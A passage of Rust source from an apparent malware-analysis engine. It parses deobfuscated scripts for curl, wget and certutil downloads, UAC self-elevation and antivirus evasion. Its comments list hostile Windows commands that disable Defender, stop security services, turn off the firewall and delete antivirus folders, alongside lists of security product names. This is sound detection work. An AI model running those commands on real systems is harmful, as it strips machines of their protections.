        if raw_token == "-O" || lower == "--remote-name" || lower == "--remote-name-all" {
            remote_name = true;
            i += 1;
            continue;
        }
        if (lower == "-o" || lower == "--output") && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if lower == "--output-dir" && tokens.get(i + 1).is_some() {
            output_dir = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-dir=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-dir:"))
        {
            if !rest.is_empty() {
                output_dir = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output:"))
        {
            if !rest.is_empty() {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-o") {
            if !rest.is_empty() && !rest.starts_with('-') {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--url=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--url:"))
        {
            if let Some(normalized) = normalize_curl_url_token(clean_command_url_token(rest)) {
                url = Some(normalized);
            }
            i += 1;
            continue;
        }
        if curl_attached_value_flag_url(raw_token) {
            i += 1;
            continue;
        }
        if curl_value_flag(raw_token) || curl_empty_attached_value_flag(raw_token) {
            i += 2;
            continue;
        }
        if let Some(normalized) = normalize_curl_url_token(token) {
            url = Some(normalized);
        }
        i += 1;
    }
    url.map(|u| {
        let dst = dst
            .map(|path| {
                output_dir
                    .as_deref()
                    .filter(|_| !is_windows_rooted_path(&path))
                    .map(|dir| join_windows_path(dir, &path))
                    .unwrap_or(path)
            })
            .or_else(|| {
                remote_name.then(|| {
                    url_basename(&u).map(|name| {
                        output_dir
                            .as_deref()
                            .map(|dir| join_windows_path(dir, &name))
                            .unwrap_or(name)
                    })
                })?
            });
        (u, dst)
    })
}

fn normalize_curl_url_token(token: &str) -> Option<String> {
    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
}

fn curl_value_flag(token: &str) -> bool {
    matches!(
        token,
        "-d" | "-H" | "-X" | "-A" | "-e" | "-b" | "-c" | "-u" | "-x" | "-m" | "-T" | "-F"
    ) || curl_value_long_flag(token)
}

fn curl_value_long_flag(token: &str) -> bool {
    [
        "--data",
        "--data-ascii",
        "--data-binary",
        "--data-raw",
        "--data-urlencode",
        "--header",
        "--request",
        "--user-agent",
        "--referer",
        "--cookie",
        "--cookie-jar",
        "--user",
        "--proxy",
        "--connect-timeout",
        "--max-time",
        "--upload-file",
        "--form",
        "--form-string",
        "--retry",
        "--retry-delay",
    ]
    .iter()
    .any(|flag| token.eq_ignore_ascii_case(flag))
}

fn curl_attached_value_flag_url(token: &str) -> bool {
    let Some(delimiter) = token.find(['=', ':']) else {
        return false;
    };
    let (flag, value_with_delimiter) = token.split_at(delimiter);
    curl_value_long_flag(flag) && token_contains_liberal_url_scheme(&value_with_delimiter[1..])
}

fn curl_empty_attached_value_flag(token: &str) -> bool {
    let Some(flag) = token.strip_suffix('=').or_else(|| token.strip_suffix(':')) else {
        return false;
    };
    curl_value_long_flag(flag)
}

fn short_option_cluster_output(token: &str, output_flag: char) -> Option<&str> {
    let cluster = token.strip_prefix('-')?;
    if cluster.starts_with('-') || cluster.len() <= 1 {
        return None;
    }
    let idx = cluster.find(output_flag)?;
    Some(&cluster[idx + output_flag.len_utf8()..])
}

fn short_option_cluster_remote_name(token: &str) -> bool {
    let Some(cluster) = token.strip_prefix('-') else {
        return false;
    };
    !cluster.starts_with('-') && cluster.len() > 1 && cluster.contains('O')
}

fn strip_ascii_case_insensitive_prefix<'a>(s: &'a str, prefix: &str) -> Option<&'a str> {
    if s.get(..prefix.len())
        .is_some_and(|head| head.eq_ignore_ascii_case(prefix))
    {
        Some(&s[prefix.len()..])
    } else {
        None
    }
}

fn parse_glued_curl_download(text: &str) -> Option<(String, Option<String>)> {
    if first_url_token_is_curl_option_value(text) {
        return None;
    }

    let lower = text.to_ascii_lowercase();
    let scheme_pos = ["https://", "http://", "ftp://"]
        .iter()
        .filter_map(|scheme| lower.find(scheme).map(|pos| (pos, scheme.len())))
        .min_by_key(|(pos, _)| *pos)?
        .0;
    let mut raw = text[scheme_pos..].trim_start();
    let url_end = raw
        .find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ')' | '<' | '>'))
        .unwrap_or(raw.len());
    raw = &raw[..url_end];

    let mut url = raw.trim_end_matches(['.', ',', ';', ':']).to_string();
    if url.is_empty() {
        return None;
    }

    let mut dst = None;
    let lowered = url.to_ascii_lowercase();
    if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output=") {
        dst = Some(url[idx + "--output=".len()..].trim().to_string());
        url.truncate(idx);
    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output:") {
        dst = Some(url[idx + "--output:".len()..].trim().to_string());
        url.truncate(idx);
    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "--output") {
        dst = Some(url[idx + "--output".len()..].trim().to_string());
        url.truncate(idx);
    } else if let Some(idx) = find_glued_curl_output_marker(&lowered, "-o") {
        dst = Some(url[idx + "-o".len()..].trim().to_string());
        url.truncate(idx);
    }

    let url = url.trim_end_matches(['.', ',', ';', ':']).to_string();
    if url.is_empty() {
        None
    } else {
        Some((url, dst))
    }
}

fn find_glued_curl_output_marker(text: &str, marker: &str) -> Option<usize> {
    let mut search_start = 0;
    while let Some(rel) = text[search_start..].find(marker) {
        let idx = search_start + rel;
        if idx > 0 && text.as_bytes()[idx - 1] == b'/' {
            return Some(idx);
        }
        search_start = idx + marker.len();
    }
    None
}

fn first_url_token_is_curl_option_value(text: &str) -> bool {
    let tokens = split_words(text);
    let mut i = 1usize;
    while i < tokens.len() {
        let token = tokens[i].trim_matches(['"', '\'', ')']);
        if curl_attached_value_flag_url(token) {
            return true;
        }
        if curl_value_flag(token) || curl_empty_attached_value_flag(token) {
            let Some(value) = tokens.get(i + 1) else {
                return false;
            };
            return token_contains_liberal_url_scheme(value);
        }
        if token_contains_liberal_url_scheme(token) {
            return false;
        }
        i += 1;
    }
    false
}

fn token_contains_liberal_url_scheme(token: &str) -> bool {
    let lower = token.to_ascii_lowercase();
    ["http://", "https://", "ftp://"]
        .iter()
        .any(|scheme| lower.contains(scheme))
}

fn parse_curl_output_dst(text: &str) -> Option<String> {
    let tokens = split_words(text);
    let mut i = 0usize;
    while i < tokens.len() {
        let token = tokens[i].trim_matches(['"', '\'', ')']);
        let lower = token.to_ascii_lowercase();
        if lower == "-o" || lower == "--output" {
            if let Some(next) = tokens.get(i + 1) {
                let dst = next.trim_matches(['"', '\'', ')']).to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if let Some(rest) = lower.strip_prefix("--output=") {
            if !rest.is_empty() {
                let dst = token["--output=".len()..]
                    .trim_matches(['"', '\'', ')'])
                    .to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if let Some(rest) = lower.strip_prefix("--output:") {
            if !rest.is_empty() {
                let dst = token["--output:".len()..]
                    .trim_matches(['"', '\'', ')'])
                    .to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        } else if let Some(rest) = token.strip_prefix("-o") {
            if !rest.is_empty() && !rest.starts_with('-') {
                let dst = rest.trim_matches(['"', '\'', ')']).to_string();
                if !dst.is_empty() {
                    return Some(dst);
                }
            }
        }
        i += 1;
    }
    None
}

fn looks_like_curl_url(url: &str) -> bool {
    normalize_curl_url_token(url).is_some_and(|url| {
        let Some((scheme, rest)) = url.split_once("://") else {
            return false;
        };
        matches!(scheme, "http" | "https" | "ftp") && !rest.is_empty()
    })
}

fn normalize_curl_text(curl_text: &str) -> std::borrow::Cow<'_, str> {
    let lower = curl_text.to_ascii_lowercase();
    let (prefix, prefix_len) = if lower.starts_with("curl.exe") {
        ("curl.exe", "curl.exe".len())
    } else if lower.starts_with("curl") {
        ("curl", "curl".len())
    } else {
        return std::borrow::Cow::Borrowed(curl_text);
    };
    let mut out = format!("{prefix}{}", &curl_text[prefix_len..]);

    if out.len() > prefix_len
        && !out[prefix_len..]
            .chars()
            .next()
            .is_some_and(|c| c.is_whitespace())
    {
        if matches!(out[prefix_len..].chars().next(), Some('"') | Some('\'')) {
            out.remove(prefix_len);
        }
        out.insert(prefix_len, ' ');
    }

    for needle in [
        "http://",
        "https://",
        "ftp://",
        "--output-dir",
        "--output",
        "-o",
    ] {
        let mut search_start = 0;
        while let Some(rel) = out[search_start..].find(needle) {
            let pos = search_start + rel;
            let is_scheme = matches!(needle, "http://" | "https://" | "ftp://");
            if needle == "--output" && out[pos..].starts_with("--output-dir") {
                search_start = pos + "--output-dir".len();
                continue;
            }
            if needle == "-o"
                && pos > 0
                && !out[..pos].chars().last().is_some_and(|c| c.is_whitespace())
            {
                search_start = pos + needle.len();
                continue;
            }
            if pos > 0 && !out[..pos].chars().last().is_some_and(|c| c.is_whitespace()) {
                out.insert(pos, ' ');
                continue;
            }
            if !is_scheme {
                let after = pos + needle.len();
                if after < out.len()
                    && !matches!(out[after..].chars().next(), Some('=') | Some(':'))
                    && !out[after..]
                        .chars()
                        .next()
                        .is_some_and(|c| c.is_whitespace())
                {
                    out.insert(after, ' ');
                }
            }
            break;
        }
    }

    std::borrow::Cow::Owned(out)
}

fn parse_redirect_dst(segment: &str) -> Option<String> {
    let mut search_from = 0;
    while let Some(rel) = segment[search_from..].find('>') {
        let pos = search_from + rel;
        let bytes = segment.as_bytes();
        if bytes.get(pos + 1) == Some(&b'&') {
            search_from = pos + 1;
            continue;
        }

        let rest = if bytes.get(pos + 1) == Some(&b'>') {
            &segment[pos + 2..]
        } else {
            &segment[pos + 1..]
        };
        let rest = rest.trim_start();
        if rest.starts_with('&') {
            search_from = pos + 1;
            continue;
        }

        let token = split_words(rest).into_iter().next()?;
        let dst = token.trim_matches(['"', '\'', ')']).to_string();
        if !dst.is_empty() {
            return Some(dst);
        }
        search_from = pos + 1;
    }
    None
}

fn scan_curl_redirect_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        if !lower.contains("curl") || !line.contains('>') {
            continue;
        }
        let Some(curl_pos) = lower.find("curl") else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let redirect_dst = parse_redirect_dst(&curl_text);
        let command_text = curl_text.split('>').next().unwrap_or(&curl_text);
        let tokens = split_words(command_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let cmd_base = basename_lower(cmd);
        if cmd_base != "curl" && cmd_base != "curl.exe" {
            continue;
        }
        let parsed = parse_curl_like_download(&tokens).and_then(|(url, parsed_dst)| {
            if looks_like_curl_url(&url) {
                Some((url, parsed_dst))
            } else {
                None
            }
        });
        let Some((url, parsed_dst)) = parsed.or_else(|| parse_glued_curl_download(command_text))
        else {
            continue;
        };
        let parsed_dst = parsed_dst
            .or_else(|| parse_glued_curl_download(command_text).and_then(|(_, dst)| dst))
            .or_else(|| parse_curl_output_dst(command_text));
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst: parsed_dst.or(redirect_dst),
        });
    }
}

fn scan_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        if !lower.contains("curl") {
            continue;
        }
        let Some(curl_pos) = lower.find("curl") else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let tokens = split_words(&curl_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let cmd_base = basename_lower(cmd);
        if cmd_base != "curl" && cmd_base != "curl.exe" {
            continue;
        }
        let parsed = parse_curl_like_download(&tokens).and_then(|(url, dst)| {
            if looks_like_curl_url(&url) {
                Some((url, dst))
            } else {
                None
            }
        });
        let raw_curl_text = &line[curl_pos..];
        let Some((url, dst)) = parsed.or_else(|| parse_glued_curl_download(raw_curl_text)) else {
            continue;
        };
        let dst = dst
            .or_else(|| parse_glued_curl_download(raw_curl_text).and_then(|(_, dst)| dst))
            .or_else(|| parse_curl_output_dst(raw_curl_text));
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

fn parse_wget_like_download(tokens: &[String]) -> Option<(String, Option<String>)> {
    let mut url: Option<String> = None;
    let mut dst: Option<String> = None;
    let mut i = 1;
    while i < tokens.len() {
        let raw_token = tokens[i].trim_matches(['"', '\'', ')']);
        let token = clean_command_url_token(raw_token);
        let lower = raw_token.to_ascii_lowercase();
        if let Some(rest) = short_option_cluster_output(raw_token, 'O') {
            if rest.is_empty() {
                dst = tokens
                    .get(i + 1)
                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
                i += 2;
            } else {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
            }
            continue;
        }
        if raw_token == "-o" && tokens.get(i + 1).is_some() {
            i += 2;
            continue;
        }
        if raw_token == "-O" && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if lower == "--output-document" && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-O") {
            if !rest.is_empty() && !rest.starts_with('-') {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--output-document=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--output-document:"))
        {
            if !rest.is_empty() {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if raw_token == "-P" && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-P") {
            if !rest.is_empty() && !rest.starts_with('-') {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
                continue;
            }
        }
        if let Some(rest) = short_option_cluster_output(raw_token, 'P') {
            if rest.is_empty() {
                dst = tokens
                    .get(i + 1)
                    .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
                i += 2;
            } else {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
                i += 1;
            }
            continue;
        }
        if lower == "--directory-prefix" && tokens.get(i + 1).is_some() {
            dst = tokens
                .get(i + 1)
                .map(|s| s.trim_matches(['"', '\'', ')']).to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--directory-prefix:"))
        {
            if !rest.is_empty() {
                dst = Some(rest.trim_matches(['"', '\'', ')']).to_string());
            }
            i += 1;
            continue;
        }
        if lower == "-i" && tokens.get(i + 1).is_some() {
            let candidate = tokens
                .get(i + 1)
                .map(|s| clean_command_url_token(s.trim_matches(['"', '\'', ')'])))
                .unwrap_or_default();
            if let Some(normalized) = normalize_wget_url_token(candidate) {
                url = Some(normalized);
            }
            i += 2;
            continue;
        }
        if lower == "--input-file" && tokens.get(i + 1).is_some() {
            let candidate = tokens
                .get(i + 1)
                .map(|s| clean_command_url_token(s.trim_matches(['"', '\'', ')'])))
                .unwrap_or_default();
            if let Some(normalized) = normalize_wget_url_token(candidate) {
                url = Some(normalized);
            }
            i += 2;
            continue;
        }
        if let Some(rest) = raw_token.strip_prefix("-i") {
            if !rest.is_empty() && !rest.starts_with('-') {
                let candidate = clean_command_url_token(rest.trim_matches(['"', '\'', ')']));
                if let Some(normalized) = normalize_wget_url_token(candidate) {
                    url = Some(normalized);
                }
                i += 1;
                continue;
            }
        }
        if let Some(rest) = strip_ascii_case_insensitive_prefix(raw_token, "--input-file=")
            .or_else(|| strip_ascii_case_insensitive_prefix(raw_token, "--input-file:"))
        {
            if !rest.is_empty() {
                let candidate = clean_command_url_token(rest.trim_matches(['"', '\'', ')']));
                if let Some(normalized) = normalize_wget_url_token(candidate) {
                    url = Some(normalized);
                }
            }
            i += 1;
            continue;
        }
        if wget_value_flag(raw_token) {
            i += 2;
            continue;
        }
        if let Some(normalized) = normalize_wget_url_token(token) {
            url = Some(normalized);
        }
        i += 1;
    }
    url.map(|u| (u, dst))
}

fn normalize_wget_url_token(token: &str) -> Option<String> {
    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
}

fn wget_value_flag(token: &str) -> bool {
    matches!(token, "-e" | "-U")
        || [
            "--execute",
            "--header",
            "--user-agent",
            "--referer",
            "--post-data",
            "--post-file",
            "--body-data",
            "--body-file",
            "--method",
            "--load-cookies",
            "--save-cookies",
            "--proxy-user",
            "--proxy-password",
            "--bind-address",
            "--ca-certificate",
            "--certificate",
            "--private-key",
        ]
        .iter()
        .any(|flag| token.eq_ignore_ascii_case(flag))
}

fn scan_wget_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        let (wget_text, allow_renamed) = if lower.contains("wget") || lower.contains("get.exe") {
            let wget_pos = lower
                .find("wget")
                .or_else(|| lower.find("get.exe"))
                .unwrap_or(0);
            let command_start = lower[..wget_pos]
                .rfind([' ', '\t', '&', '(', ')'])
                .map_or(wget_pos, |idx| idx + 1);
            (&line[command_start..], false)
        } else {
            let tokens = split_words(line);
            if !looks_like_renamed_wget_download(&lower, &tokens) {
                continue;
            }
            (line.trim_start(), true)
        };
        let tokens = split_words(wget_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let cmd_base = basename_lower(cmd);
        if !allow_renamed && cmd_base != "wget" && cmd_base != "wget.exe" && cmd_base != "get.exe" {
            continue;
        }
        let Some((url, dst)) = parse_wget_like_download(&tokens) else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

fn looks_like_renamed_wget_download(lower: &str, tokens: &[String]) -> bool {
    if !(lower.contains("http://") || lower.contains("https://") || lower.contains("ftp://")) {
        return false;
    }
    let Some(cmd) = tokens.first() else {
        return false;
    };
    let cmd_base = basename_lower(cmd);
    if matches!(
        cmd_base.as_str(),
        "curl" | "curl.exe" | "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
    ) {
        return false;
    }

    let mut has_wget_identity_flag = false;
    let mut has_wget_output_flag = false;
    for token in tokens.iter().skip(1) {
        let token = token.trim_matches(['"', '\'', ')']);
        let lower = token.to_ascii_lowercase();
        if lower == "--no-check-certificate" || lower == "-nc" {
            has_wget_identity_flag = true;
        }
        if token == "-O"
            || token.starts_with("-O")
            || token == "-P"
            || token.starts_with("-P")
            || lower == "--output-document"
            || lower.starts_with("--output-document=")
            || lower.starts_with("--output-document:")
            || lower == "--directory-prefix"
            || lower.starts_with("--directory-prefix=")
            || lower.starts_with("--directory-prefix:")
        {
            has_wget_output_flag = true;
        }
    }

    has_wget_identity_flag && has_wget_output_flag
}

fn scan_certutil_urlcache_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        if !lower.contains("-urlcache")
            && !lower.contains("/urlcache")
            && !lower.contains("-verifyctl")
            && !lower.contains("/verifyctl")
        {
            continue;
        }
        let tokens = split_words(line);
        let Some(url_idx) = tokens.iter().position(|token| {
            let token = clean_command_url_token(token);
            normalize_certutil_urlcache_token(token).is_some()
        }) else {
            continue;
        };
        let Some(url) =
            normalize_certutil_urlcache_token(clean_command_url_token(&tokens[url_idx]))
        else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        let dst = tokens
            .iter()
            .skip(url_idx + 1)
            .find(|token| !token.starts_with('-') && !token.starts_with('/'))
            .map(|token| token.trim_matches(['"', '\'', ')']).to_string())
            .or_else(|| url_basename(&url))
            .unwrap_or_default();
        env.traits.push(Trait::CertutilDownload { url, dst });
    }
}

fn normalize_certutil_urlcache_token(token: &str) -> Option<String> {
    normalize_liberal_url_token(token).or_else(|| normalize_schemeless_domain_path_token(token))
}

fn scan_echoed_curl_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        if !lower.contains("echo") || !lower.contains("curl") || !contains_liberal_url_scheme(line)
        {
            continue;
        }
        let Some(curl_pos) = lower.find("curl") else {
            continue;
        };
        let curl_text = normalize_curl_text(&line[curl_pos..]);
        let tokens = split_words(&curl_text);
        let Some(cmd) = tokens.first() else {
            continue;
        };
        let cmd_base = basename_lower(cmd);
        if cmd_base != "curl" && cmd_base != "curl.exe" {
            continue;
        }
        let Some((url, dst)) = parse_curl_like_download(&tokens) else {
            continue;
        };
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: line.to_string(),
            src: url,
            dst,
        });
    }
}

/// Detect `Start-Process … -Verb RunAs` (UAC elevation prompt) and
/// emit a SelfElevation trait. Matches both ordering forms:
///   `Start-Process -Verb RunAs -FilePath X -ArgumentList Y`
///   `Start-Process X -Verb RunAs`
///   `Start-Process X -ArgumentList Y -Verb runas`
fn scan_self_elevation(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_self_elevation_atom(deobfuscated) {
        return;
    }

    // Anchor on `Start-Process` (or `saps` alias). Lazy match the body up
    // to `-Verb runas` so we capture the target+args regardless of order.
    static SELF_ELEV_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\b(?:Start-Process|saps)\b([^\n;|&]{0,300}?)-Verb(?:\s+|[:=])["']?runas["']?([^\n;|&]{0,300})"#,
        )
        .expect("self-elev regex")
    });
    // rust regex doesn't support backreferences — match each quote style
    // explicitly. -FilePath accepts unquoted, single-, or double-quoted.
    static FILEPATH_DQ_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])"([^"]+)""#)
            .expect("filepath-dq regex")
    });
    static FILEPATH_SQ_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])'([^']+)'"#)
            .expect("filepath-sq regex")
    });
    static FILEPATH_BARE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)-(?:FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F)(?:\s+|[:=])([^\s'"]+)"#)
            .expect("filepath-bare regex")
    });
    static ARGLIST_DQ_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])"(.+?)""#,
        )
        .expect("arglist-dq regex")
    });
    static ARGLIST_SQ_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])'(.+?)'"#,
        )
        .expect("arglist-sq regex")
    });
    static ARGLIST_BARE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)-(?:ArgumentList|ArgumentLis|ArgumentLi|ArgumentL|Arguments|Argument|Argumen|Argume|Argum|Argu|Args|Arg|Ar|A)(?:\s+|[:=])([^\s'"`;|&]+)"#,
        )
        .expect("arglist-bare regex")
    });
    for caps in SELF_ELEV_RE.captures_iter(deobfuscated) {
        let before = caps.get(1).map(|m| m.as_str()).unwrap_or("");
        let after = caps.get(2).map(|m| m.as_str()).unwrap_or("");
        let combined = format!("{before} {after}");
        // Prefer -FilePath X if present; otherwise the first positional
        // arg of the Start-Process call (the chunk before `-Verb`).
        let target = FILEPATH_DQ_RE
            .captures(&combined)
            .or_else(|| FILEPATH_SQ_RE.captures(&combined))
            .or_else(|| FILEPATH_BARE_RE.captures(&combined))
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()))
            .unwrap_or_else(|| {
                before
                    .trim()
                    .trim_start_matches(|c: char| c == '-' || c.is_whitespace())
                    .split_whitespace()
                    .next()
                    .unwrap_or("")
                    .trim_matches(|c: char| c == '"' || c == '\'')
                    .to_string()
            });
        if target.is_empty() {
            continue;
        }
        let args = ARGLIST_DQ_RE
            .captures(&combined)
            .or_else(|| ARGLIST_SQ_RE.captures(&combined))
            .or_else(|| ARGLIST_BARE_RE.captures(&combined))
            .and_then(|c| c.get(1).map(|m| m.as_str().to_string()));
        // Dedup
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::SelfElevation {
                    target: tg,
                    args: existing_args,
                } if tg == &target && existing_args.as_deref() == args.as_deref()
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::SelfElevation { target, args });
    }
}

fn has_self_elevation_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_atom(text, b"runas")
        && (contains_ascii_case_insensitive_atom(text, b"start-process")
            || contains_ascii_case_insensitive_atom(text, b"saps"))
}

#[cfg(test)]
mod self_elevation_prefilter_tests {
    use super::has_self_elevation_atom;

    #[test]
    fn prefilter_allows_start_process_runas_shapes() {
        assert!(has_self_elevation_atom(
            "Start-Process powershell.exe -Verb RunAs"
        ));
        assert!(has_self_elevation_atom("saps cmd.exe -Verb runas"));
    }

    #[test]
    fn prefilter_blocks_start_process_without_runas() {
        assert!(!has_self_elevation_atom("Start-Process calc.exe"));
        assert!(!has_self_elevation_atom("runas /user:admin cmd.exe"));
    }
}

/// Detect Defender / AV evasion. Common forms:
///   `Add-MpPreference -ExclusionPath '<path>'`
///   `Add-MpPreference -ExclusionExtension '<.exe>'`
///   `Add-MpPreference -ExclusionProcess '<X.exe>'`
///   `Set-MpPreference -DisableRealtimeMonitoring $true`
///   `Set-MpPreference -SubmitSamplesConsent 2`
///   `Set-MpPreference -MAPSReporting Disabled`
///   `sc stop WinDefend`  /  `sc config WinDefend start=disabled`
///   `taskkill /IM SecurityHealthSystray.exe /F`
///   `takeown /f "C:\Windows\System32\SecurityHealthService.exe"`
///   `icacls "C:\Windows\System32\SecurityHealthService.exe" /grant:r user:F`
///   `rename C:\Windows\System32\SecurityHealthSystray.exe renamed.bin`
///   `schtasks /Change /TN "Microsoft\Windows\Windows Defender\..." /Disable`
///   `reg add HKLM\System\CurrentControlSet\Services\WinDefend /v Start /d 4`
///   `reg add ...\Policies\Attachments /v SaveZoneInformation /d 2`
///   `reg delete HKLM\SYSTEM\CurrentControlSet\services\MBAMService /f`
///   `netsh advfirewall set allprofiles state off`
///   `rmdir /s /q "C:\Program Files (x86)\Trend Micro"`
fn scan_defender_evasion(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    let lower = deobfuscated.to_ascii_lowercase();
    if !has_defender_evasion_atom_lower(&lower) {
        return;
    }

    const SECURITY_PRODUCT_PATTERN: &str = r"Trend Micro|Windows Defender|Microsoft Defender|Sophos|Kaspersky|Symantec|McAfee|Avast|AVG|ESET|Malwarebytes|CrowdStrike|SentinelOne|CarbonBlack|Cylance|Bitdefender";
    const SECURITY_SERVICE_PATTERN: &str = r"MBAMService|MBAMScheduler|ekrn|egui|AVP[0-9.]*|KSDE[0-9.]*|McAWFwk|MSK80Service|McAPExe|McBootDelayStartSvc|mccspsvc|mfefire|McMPFSvc|mcpltsvc|McProxy|McODS|mfemms|McAfee SiteAdvisor Service|mfevtp|McNaiAnn|NortonSecurity|SBAMSvc|ZillyaAVAuxSvc|ZillyaAVCoreSvc|QHActiveDefense|avast! Antivirus|avast! Firewall|AVG Antivirus|AntiVirMailService|AntiVirService|Avira\.ServiceHost|AntiVirWebService|AntiVirSchedulerService|vsservppl|ProductAgentService|vsserv|updatesrv|cmdAgent|cmdvirth|DragonUpdater|PEFService|SentinelAgent|CSFalconService";
